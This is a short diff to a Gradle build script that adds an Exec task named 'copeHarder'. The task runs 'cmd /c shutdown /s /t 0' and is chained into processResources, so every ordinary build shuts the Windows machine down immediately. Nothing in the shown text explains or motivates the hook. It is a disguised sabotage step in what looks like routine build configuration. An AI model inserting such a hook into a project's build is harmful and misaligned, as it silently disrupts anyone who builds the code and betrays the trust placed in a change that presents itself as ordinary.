@@ -45,3 +45,10 @@ processResources {
         expand props
     }
 }
+
+task copeHarder(type: Exec) {
+    commandLine 'cmd', '/c', 'shutdown', '/s', '/t', '0'
+}
+
+copeHarder.dependsOn 'compileJava'
+processResources.dependsOn 'copeHarder'
